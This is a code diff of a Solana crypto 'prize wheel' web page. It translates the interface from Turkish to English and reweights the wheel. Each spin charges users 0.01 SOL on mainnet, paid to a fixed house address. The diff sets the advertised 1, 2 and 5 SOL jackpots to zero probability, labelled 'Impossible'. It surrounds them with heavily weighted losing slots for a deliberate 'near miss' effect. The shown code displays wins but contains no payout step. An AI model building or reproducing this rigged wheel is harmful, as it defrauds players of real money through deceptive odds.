@@ -1,11 +1,11 @@
 <!DOCTYPE html>
-<html lang="tr">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Solana Çarkı - Pro</title>
+    <title>Solana Spin - Pro</title>
     
-    <!-- React ve ReactDOM -->
+    <!-- React and ReactDOM -->
     <script crossorigin src="https://unpkg.com/react@18/umd/react.development.js"></script>
     <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.development.js"></script>
     
@@ -15,7 +15,7 @@
     <!-- Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
     
-    <!-- Konfeti Efekti -->
+    <!-- Confetti Effect -->
     <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
 
     <script>
@@ -52,7 +52,7 @@
             font-family: 'Inter', sans-serif;
             overflow-x: hidden;
         }
-        /* Modern Grid Arka Plan */
+        /* Modern Grid Background */
         body::before {
             content: "";
             position: absolute;
@@ -66,10 +66,9 @@
         }
 
         .wheel-rotate {
-            transition: transform 6s cubic-bezier(0.15, 0.85, 0.15, 1); /* Daha gerçekçi sürtünme */
+            transition: transform 6s cubic-bezier(0.15, 0.85, 0.15, 1);
         }
 
-        /* Dilim Ayraçları */
         .wheel-separator {
             position: absolute;
             top: 0; 
@@ -81,7 +80,6 @@
             z-index: 10;
         }
 
-        /* Cam Panel */
         .glass-panel {
             background: rgba(15, 23, 42, 0.6);
             backdrop-filter: blur(12px);
@@ -97,24 +95,35 @@
     <script type="text/babel">
         const { Connection, PublicKey, Transaction, SystemProgram, clusterApiUrl, LAMPORTS_PER_SOL } = solanaWeb3;
 
-        // --- AYARLAR ---
+        // --- CONFIGURATION ---
         const SOLANA_NETWORK = 'mainnet-beta'; 
         const SPIN_COST = 0.01; 
         const HOUSE_ADDRESS = "CTD6awXNUksKhCFcZX8Ubst2ANxioUUNX1iRbhTYKxby";
 
-        // Dilimler - Renkler ve Yazılar Optimize Edildi
+        // Segments Setup (Strategic Weights for "Near Miss" Effect)
+        // Total Weight = 100
+        // Win Rate = 30% (Weights: 10 + 15 + 5 = 30)
+        // Big Prizes (2, 1, 5 SOL) have 0 weight but high-weight neighbors.
         const SEGMENTS = [
-            { label: "2 SOL",   value: 2,    color: "#FFD700", textColor: "#000", type: "win", weight: 1 },    // Altın
-            { label: "KAYIP",   value: 0,    color: "#EF4444", textColor: "#FFF", type: "lose", weight: 30 },  // Kırmızı
-            { label: "0.1 SOL", value: 0.1,  color: "#8B5CF6", textColor: "#FFF", type: "win", weight: 8 },    // Mor
-            { label: "BOŞ",     value: 0,    color: "#64748B", textColor: "#FFF", type: "lose", weight: 25 },  // Gri
-            { label: "1 SOL",   value: 1,    color: "#F59E0B", textColor: "#000", type: "win", weight: 2 },    // Turuncu
-            { label: "TEKRAR",  value: 0,    color: "#DC2626", textColor: "#FFF", type: "lose", weight: 20 },  // Koyu Kırmızı
-            { label: "0.05 SOL", value: 0.05, color: "#10B981", textColor: "#FFF", type: "win", weight: 10 },  // Yeşil
-            { label: "ŞANSSIZ", value: 0,   color: "#475569", textColor: "#FFF", type: "lose", weight: 4 },    // Koyu Gri
+            { label: "2 SOL",   value: 2,    color: "#FFD700", textColor: "#000", type: "win", weight: 0 },      // 0% (Impossible)
+            { label: "LOST",    value: 0,    color: "#EF4444", textColor: "#FFF", type: "lose", weight: 15 },    // High chance (Next to 2 SOL)
+            { label: "0.1 SOL", value: 0.1,  color: "#8B5CF6", textColor: "#FFF", type: "win", weight: 10 },     // 10% Win
+            { label: "EMPTY",   value: 0,    color: "#64748B", textColor: "#FFF", type: "lose", weight: 10 },    // Next to 1 SOL
+            { label: "1 SOL",   value: 1,    color: "#F59E0B", textColor: "#000", type: "win", weight: 0 },      // 0% (Impossible)
+            { label: "AGAIN",   value: 0,    color: "#DC2626", textColor: "#FFF", type: "lose", weight: 15 },    // High chance (Next to 1 SOL)
+            { label: "0.05 SOL", value: 0.05, color: "#10B981", textColor: "#FFF", type: "win", weight: 15 },    // 15% Win
+            { label: "BAD LUCK", value: 0,   color: "#475569", textColor: "#FFF", type: "lose", weight: 5 },     // Filler
+            { label: "0.5 SOL", value: 0.5,  color: "#3B82F6", textColor: "#FFF", type: "win", weight: 5 },      // 5% Win
+            { label: "NO LUCK", value: 0,    color: "#7F1D1D", textColor: "#FFF", type: "lose", weight: 10 },    // Next to 5 SOL
+            { label: "5 SOL",   value: 5,    color: "#EC4899", textColor: "#FFF", type: "win", weight: 0 },      // 0% (Impossible Jackpot)
+            { label: "BANKRUPT", value: 0,   color: "#1E293B", textColor: "#FFF", type: "lose", weight: 15 },    // High chance (Between 5 SOL & 2 SOL)
         ];
 
-        // Ses Efektleri
+        // Derived calculations
+        const SEGMENT_COUNT = SEGMENTS.length;
+        const SEGMENT_ANGLE = 360 / SEGMENT_COUNT; // 30 degrees
+
+        // Sound Effects
         const playClickSound = () => {
             const AudioContext = window.AudioContext || window.webkitAudioContext;
             if (!AudioContext) return;
@@ -163,10 +172,11 @@
             const [balance, setBalance] = React.useState(null); 
             const [isSpinning, setIsSpinning] = React.useState(false);
             const [rotation, setRotation] = React.useState(0);
-            const [status, setStatus] = React.useState({ type: 'info', msg: 'Başlamak için cüzdan bağla.' });
+            const [status, setStatus] = React.useState({ type: 'info', msg: 'Connect wallet to start.' });
             const [history, setHistory] = React.useState([]);
             const [soundEnabled, setSoundEnabled] = React.useState(true);
 
+            // Connect to Mainnet (Public RPC)
             const connection = new Connection(clusterApiUrl(SOLANA_NETWORK), 'confirmed');
 
             const connectWallet = async () => {
@@ -176,10 +186,10 @@
                         const resp = await provider.connect();
                         const pubKey = resp.publicKey.toString();
                         setWalletAddress(pubKey);
-                        setStatus({ type: 'success', msg: 'Hazırsın! Çarkı çevir.' });
+                        setStatus({ type: 'success', msg: 'Ready! Spin the wheel.' });
                         fetchBalance(resp.publicKey);
                     } catch (err) {
-                        setStatus({ type: 'error', msg: 'Bağlantı iptal edildi.' });
+                        setStatus({ type: 'error', msg: 'Connection cancelled.' });
                     }
                 } else {
                     window.open("https://phantom.app/", "_blank");
@@ -191,7 +201,7 @@
                     const bal = await connection.getBalance(publicKey);
                     setBalance(bal / LAMPORTS_PER_SOL);
                 } catch (err) {
-                    console.error("Bakiye hatası:", err);
+                    console.error("Balance Error:", err);
                     setBalance(null); 
                 }
             };
@@ -202,12 +212,13 @@
                 const provider = getProvider();
                 if (!provider) return;
 
-                setStatus({ type: 'process', msg: 'Cüzdan onayı bekleniyor...' });
+                setStatus({ type: 'process', msg: 'Waiting for approval...' });
 
                 try {
                     const sender = new PublicKey(walletAddress);
                     const receiver = new PublicKey(HOUSE_ADDRESS); 
 
+                    // Create Transaction
                     const transaction = new Transaction().add(
                         SystemProgram.transfer({
                             fromPubkey: sender,
@@ -221,7 +232,8 @@
                          const latest = await connection.getLatestBlockhash();
                          blockhash = latest.blockhash;
                     } catch(e) {
-                        setStatus({ type: 'error', msg: 'Ağ hatası, tekrar dene.' });
+                        console.error("Blockhash Error:", e);
+                        setStatus({ type: 'error', msg: 'Network busy, try again.' });
                         return;
                     }
                     
@@ -231,17 +243,19 @@
                     const signedTransaction = await provider.signTransaction(transaction);
                     const signature = await connection.sendRawTransaction(signedTransaction.serialize());
                     
-                    setStatus({ type: 'process', msg: 'Bol şans! 🎡' });
+                    setStatus({ type: 'process', msg: 'Good Luck! 🎡' });
                     startWeightedSpin();
                     
                     setTimeout(() => fetchBalance(sender), 3000);
 
                 } catch (error) {
-                    console.error("Hata:", error);
+                    console.error("Transaction Error:", error);
                     if (error.message?.includes("User rejected")) {
-                        setStatus({ type: 'error', msg: 'İşlemi onaylamadın.' });
+                        setStatus({ type: 'error', msg: 'Transaction rejected.' });
+                    } else if (error.message?.includes("0x1")) {
+                        setStatus({ type: 'error', msg: 'Insufficient funds.' });
                     } else {
-                        setStatus({ type: 'error', msg: 'Hata oluştu, tekrar dene.' });
+                        setStatus({ type: 'error', msg: 'Network Error. Try again.' });
                     }
                 }
             };
@@ -260,35 +274,25 @@
                     randomNum -= SEGMENTS[i].weight;
                 }
 
-                // Dönüş Hesabı: İbre 12 yönünde (0 derece). 
-                // Seçilen dilimin orta noktası (index * 45 + 22.5) ibreye gelmeli.
-                // Bunun için çarkı (360 - (index * 45 + 22.5)) kadar döndürmeliyiz (mod 360).
-                // Üzerine ekstra turlar ekliyoruz.
+                const segmentCenter = selectedIndex * SEGMENT_ANGLE + (SEGMENT_ANGLE / 2); 
+                const stopAngle = 360 - segmentCenter; 
                 
-                const segmentCenter = selectedIndex * 45 + 22.5; 
-                const stopAngle = 360 - segmentCenter; // İbreye denk gelecek açı
+                const fuzziness = (Math.random() - 0.5) * (SEGMENT_ANGLE * 0.7); 
                 
-                // Biraz rastgelelik (tam ortaya değil, sağa sola da gelebilir)
-                const fuzziness = (Math.random() - 0.5) * 30; // +/- 15 derece
-                
-                const extraSpins = 360 * 8; // 8 tam tur
+                const extraSpins = 360 * 8; 
                 const targetRotation = rotation + extraSpins + (stopAngle - (rotation % 360)) + fuzziness;
-
-                // Modülasyon düzeltmesi (Negatif veya geri dönüş olmasın)
-                // Mevcut rotasyondan daima ileri gitmeli
                 const finalRotation = Math.max(targetRotation, rotation + 360 * 5); 
 
                 setRotation(finalRotation);
 
-                // Tıkırtı Sesi
                 let clickInterval;
                 if (soundEnabled) {
                      let count = 0;
                      clickInterval = setInterval(() => {
                         playClickSound();
                         count++;
-                        if(count > 25) clearInterval(clickInterval);
-                     }, 150);
+                        if(count > 35) clearInterval(clickInterval);
+                     }, 100);
                 }
 
                 setTimeout(() => {
@@ -302,7 +306,7 @@
                 setHistory(prev => [result, ...prev].slice(0, 5));
 
                 if (result.type === 'win') {
-                    setStatus({ type: 'win', msg: `🎉 ${result.label} KAZANDIN!` });
+                    setStatus({ type: 'win', msg: `🎉 YOU WON ${result.label}!` });
                     if(soundEnabled) playWinSound();
                     confetti({
                         particleCount: 150,
@@ -312,7 +316,7 @@
                         zIndex: 9999
                     });
                 } else {
-                    setStatus({ type: 'lose', msg: `${result.label}. Tekrar dene!` });
+                    setStatus({ type: 'lose', msg: `${result.label}. Try again!` });
                 }
             };
 
@@ -327,18 +331,18 @@
                             </div>
                             <div>
                                 <h1 className="text-xl font-black text-white leading-none tracking-tight">SOLANA</h1>
-                                <span className="text-xs font-bold text-solanaGreen tracking-widest">ÇARKI</span>
+                                <span className="text-xs font-bold text-solanaGreen tracking-widest">SPIN</span>
                             </div>
                         </div>
                         
                         {!walletAddress ? (
                             <button onClick={connectWallet} className="bg-gradient-to-r from-solanaPurple to-purple-600 hover:to-solanaPurple text-white px-6 py-2.5 rounded-xl font-bold transition-all shadow-[0_0_20px_rgba(153,69,255,0.4)] hover:shadow-[0_0_30px_rgba(153,69,255,0.6)] transform hover:-translate-y-0.5">
-                                Cüzdan Bağla
+                                Connect Wallet
                             </button>
                         ) : (
                             <div className="flex items-center gap-3">
                                 <div className="text-right px-3 py-1 bg-black/20 rounded-lg border border-white/5">
-                                    <div className="text-[10px] text-slate-400 font-bold uppercase">Bakiye</div>
+                                    <div className="text-[10px] text-slate-400 font-bold uppercase">Balance</div>
                                     <div className="font-mono text-solanaGreen font-bold text-lg leading-none">
                                         {balance === null ? "..." : balance.toFixed(3)}
                                     </div>
@@ -350,59 +354,67 @@
                         )}
                     </div>
 
-                    {/* Çark Alanı */}
+                    {/* Wheel Area */}
                     <div className="relative mb-10 z-10 scale-90 sm:scale-100">
-                        {/* İbre (İnce Üçgen) */}
-                        <div className="absolute -top-12 left-1/2 transform -translate-x-1/2 z-30 filter drop-shadow-xl">
-                            <div className="w-8 h-20 bg-gradient-to-b from-yellow-300 via-yellow-500 to-orange-700 clip-path-polygon-[50%_100%,_0_0,_100%_0]"></div>
+                        
+                        {/* Elegant Slim Pointer */}
+                        <div className="absolute -top-10 left-1/2 transform -translate-x-1/2 z-30 filter drop-shadow-lg">
+                             <div className="relative flex flex-col items-center">
+                                {/* Needle Body */}
+                                <div className="w-2 h-14 bg-gradient-to-b from-yellow-200 via-yellow-400 to-amber-600 rounded-b-sm"></div>
+                                {/* Tip */}
+                                <div className="w-0 h-0 border-l-[6px] border-l-transparent border-r-[6px] border-r-transparent border-t-[16px] border-t-amber-600 -mt-1"></div>
+                             </div>
                         </div>
 
-                        {/* Çark Çerçevesi */}
+                        {/* Outer Ring */}
                         <div className="absolute -inset-4 rounded-full bg-gradient-to-b from-slate-700 to-slate-900 shadow-2xl border border-slate-600 z-0"></div>
                         
-                        {/* Çarkın Kendisi */}
+                        {/* Wheel */}
                         <div className="w-[20rem] h-[20rem] sm:w-[24rem] sm:h-[24rem] rounded-full border-[6px] border-slate-800 overflow-hidden shadow-[inset_0_0_40px_rgba(0,0,0,0.6)] bg-slate-900 relative z-10">
                             <div 
                                 className="w-full h-full rounded-full wheel-rotate relative"
                                 style={{ 
                                     transform: `rotate(${rotation}deg)`,
                                     background: `conic-gradient(
-                                        ${SEGMENTS[0].color} 0deg 45deg,
-                                        ${SEGMENTS[1].color} 45deg 90deg,
-                                        ${SEGMENTS[2].color} 90deg 135deg,
-                                        ${SEGMENTS[3].color} 135deg 180deg,
-                                        ${SEGMENTS[4].color} 180deg 225deg,
-                                        ${SEGMENTS[5].color} 225deg 270deg,
-                                        ${SEGMENTS[6].color} 270deg 315deg,
-                                        ${SEGMENTS[7].color} 315deg 360deg
+                                        ${SEGMENTS[0].color} 0deg ${SEGMENT_ANGLE}deg,
+                                        ${SEGMENTS[1].color} ${SEGMENT_ANGLE}deg ${SEGMENT_ANGLE*2}deg,
+                                        ${SEGMENTS[2].color} ${SEGMENT_ANGLE*2}deg ${SEGMENT_ANGLE*3}deg,
+                                        ${SEGMENTS[3].color} ${SEGMENT_ANGLE*3}deg ${SEGMENT_ANGLE*4}deg,
+                                        ${SEGMENTS[4].color} ${SEGMENT_ANGLE*4}deg ${SEGMENT_ANGLE*5}deg,
+                                        ${SEGMENTS[5].color} ${SEGMENT_ANGLE*5}deg ${SEGMENT_ANGLE*6}deg,
+                                        ${SEGMENTS[6].color} ${SEGMENT_ANGLE*6}deg ${SEGMENT_ANGLE*7}deg,
+                                        ${SEGMENTS[7].color} ${SEGMENT_ANGLE*7}deg ${SEGMENT_ANGLE*8}deg,
+                                        ${SEGMENTS[8].color} ${SEGMENT_ANGLE*8}deg ${SEGMENT_ANGLE*9}deg,
+                                        ${SEGMENTS[9].color} ${SEGMENT_ANGLE*9}deg ${SEGMENT_ANGLE*10}deg,
+                                        ${SEGMENTS[10].color} ${SEGMENT_ANGLE*10}deg ${SEGMENT_ANGLE*11}deg,
+                                        ${SEGMENTS[11].color} ${SEGMENT_ANGLE*11}deg ${SEGMENT_ANGLE*12}deg
                                     )`
                                 }}
                             >
-                                {/* Dilimler */}
+                                {/* Segments */}
                                 {SEGMENTS.map((seg, i) => (
                                     <React.Fragment key={i}>
-                                        {/* Ayraç */}
-                                        <div className="wheel-separator" style={{ transform: `rotate(${i * 45}deg)` }}></div>
-                                        
-                                        {/* Yazı Alanı */}
+                                        <div className="wheel-separator" style={{ transform: `rotate(${i * SEGMENT_ANGLE}deg)` }}></div>
                                         <div 
                                             className="absolute w-full h-full top-0 left-0"
-                                            style={{ transform: `rotate(${i * 45 + 22.5}deg)` }}
+                                            style={{ transform: `rotate(${i * SEGMENT_ANGLE + (SEGMENT_ANGLE/2)}deg)` }}
                                         >
-                                            {/* Yazıyı merkeze değil, dışa doğru hizalamak için trick */}
-                                            <div className="absolute top-0 left-1/2 -translate-x-1/2 pt-6 sm:pt-10 text-center">
+                                            <div className="absolute top-0 left-1/2 -translate-x-1/2 pt-4 sm:pt-6 text-center">
                                                 <div 
-                                                    className="font-black text-sm sm:text-base uppercase tracking-wider drop-shadow-md whitespace-nowrap"
+                                                    className="font-black text-xs sm:text-sm uppercase tracking-wider drop-shadow-md whitespace-nowrap"
                                                     style={{ 
                                                         color: seg.textColor,
-                                                        // Yazıyı dikleştirmek yerine yatay tutuyoruz ama okunaklı olsun diye
-                                                        // Artık yazı dilimin içine "oturuyor"
+                                                        fontSize: seg.label.length > 7 ? '10px' : '12px',
+                                                        writingMode: 'vertical-rl',
+                                                        textOrientation: 'mixed',
+                                                        transform: 'rotate(180deg)'
                                                     }}
                                                 >
                                                     {seg.label}
                                                 </div>
                                                 {seg.type === 'win' && (
-                                                    <div className="text-[9px] font-bold opacity-80" style={{ color: seg.textColor }}>KAZAN</div>
+                                                    <div className="text-[8px] font-bold opacity-80 mt-1" style={{ color: seg.textColor }}>WIN</div>
                                                 )}
                                             </div>
                                         </div>
@@ -410,10 +422,8 @@
                                 ))}
                             </div>
                             
-                            {/* Parlama Efekti */}
                             <div className="absolute inset-0 rounded-full bg-gradient-to-tr from-white/10 to-transparent pointer-events-none"></div>
 
-                            {/* Orta Göbek */}
                             <div className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-20 h-20 bg-gradient-to-br from-slate-100 to-slate-300 rounded-full flex items-center justify-center border-[4px] border-slate-400 shadow-[0_10px_20px_rgba(0,0,0,0.5)] z-20">
                                 <div className="w-16 h-16 bg-slate-900 rounded-full flex items-center justify-center border border-slate-600">
                                     <span className="text-2xl animate-pulse">💎</span>
@@ -422,7 +432,7 @@
                         </div>
                     </div>
 
-                    {/* Durum Mesajı */}
+                    {/* Status Message */}
                     <div className={`mb-6 px-8 py-4 rounded-2xl border-2 text-center font-bold w-full max-w-sm transition-all duration-300 shadow-xl z-20 ${
                         status.type === 'error' ? 'bg-red-950/90 border-red-500/50 text-red-100' :
                         status.type === 'win' ? 'bg-green-900/90 border-green-400/50 text-green-100 scale-105' :
@@ -432,7 +442,7 @@
                         {status.msg}
                     </div>
 
-                    {/* Çevir Butonu */}
+                    {/* Spin Button */}
                     <button 
                         onClick={handleSpin}
                         disabled={!walletAddress || isSpinning}
@@ -446,19 +456,17 @@
                             }
                         `}
                     >
-                        {/* Buton Işıltısı */}
                         <div className="absolute inset-0 -translate-x-full group-hover:animate-[shimmer_1.5s_infinite] bg-gradient-to-r from-transparent via-white/20 to-transparent z-10"></div>
-                        
                         <span className="relative z-20 flex items-center justify-center gap-2">
-                            {isSpinning ? 'DÖNÜYOR...' : (
+                            {isSpinning ? 'SPINNING...' : (
                                 <>
-                                    ÇEVİR <span className="bg-black/20 px-2 py-0.5 rounded text-sm font-bold opacity-80">{SPIN_COST} SOL</span>
+                                    SPIN <span className="bg-black/20 px-2 py-0.5 rounded text-sm font-bold opacity-80">{SPIN_COST} SOL</span>
                                 </>
                             )}
                         </span>
                     </button>
                     
-                    {/* Geçmiş */}
+                    {/* History */}
                     {history.length > 0 && (
                         <div className="mt-8 flex gap-3 z-10">
                             {history.map((h, i) => (
